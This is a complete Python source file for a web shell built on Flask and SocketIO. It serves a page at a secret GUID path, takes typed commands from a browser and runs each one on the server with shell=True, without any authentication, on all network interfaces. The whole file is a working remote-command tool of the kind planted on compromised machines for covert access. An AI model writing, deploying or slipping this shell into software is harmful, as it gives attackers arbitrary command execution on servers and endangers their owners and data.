#!/usr/bin/env python3

"""
python3 based web shell
based on gist here: https://gist.github.com/phoemur/461c97aa5af5c785062b7b4db8ca79cd
modified by @__timk to:
* make output a bit nicer and safer
* work regardless of scheme
* append a GUID to the end of the path to provide security through obscurity :)
"""

import os
import subprocess
from flask import Flask, render_template
from flask_socketio import SocketIO, send, emit

SHELL_PATH_GUID='124c7c56-d6c6-4c2f-bd9a-c220dde30d0d'

HTML = '''
<html>
    <head>
        <script type="text/javascript" src="//code.jquery.com/jquery-3.2.1.min.js"></script>
        <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/socket.io/1.3.6/socket.io.min.js"></script>
        <script type="text/javascript" charset="utf-8">
            var socket;
            $(document).ready(function(){
                socket = io.connect('//' + document.domain + ':' + location.port + location.pathname + '/shell');
                socket.on('connect', function() {
                    socket.emit('joined', {});
                });
                socket.on('message', function(data) {
                    var p = document.createElement('p');
                    var pre = document.createElement('pre');
                    pre.innerText = data.msg;
                    p.appendChild(pre);
                    document.getElementById('shell').appendChild(p);
                });
                socket.on('status', function(data) {
                    var p = document.createElement('p');
                    var pre = document.createElement('pre');
                    pre.innerText = data.msg;
                    p.appendChild(pre);
                    document.getElementById('shell').appendChild(p);
                });
                $('#text').keypress(function(e) {
                    var code = e.keyCode || e.which;
                    if (code == 13) {
                        text = $('#text').val();
                        $('#text').val('');
                        socket.emit('comando', {msg: text});
                    }
                });
            });
            function leave_room() {
                socket.disconnect();
                window.location.href = "about:blank";
            }
        </script>
    </head>
    <body>
        <div id="shell"></div><br><br>
        <input id="text" size="80" placeholder="Commands go here"><br><br>
        <a href="#" onclick="leave_room();">Exit</a>
    </body>
</html>
'''

app = Flask(__name__)
socketio = SocketIO(app)

@app.route('/' + SHELL_PATH_GUID)
def index():
    return HTML

@socketio.on('joined', namespace='/' + SHELL_PATH_GUID + '/shell')
def joined(message):
    emit('status', {'msg': '[*] Sucessfully connected to host'})
    
@socketio.on('comando', namespace='/' + SHELL_PATH_GUID + '/shell')
def comando(comando):
    c = comando['msg']
    emit('message', {'msg': '$ ' + c})
    print(c)
    try:
        b = subprocess.check_output(c, shell=True).decode()
    except Exception as err:
        b = str(err)
        
    emit('message', {'msg': b})
    
if __name__ == '__main__':
    PORT = int(os.getenv('PORT', '5000'))
    socketio.run(app, host='0.0.0.0', port=PORT)
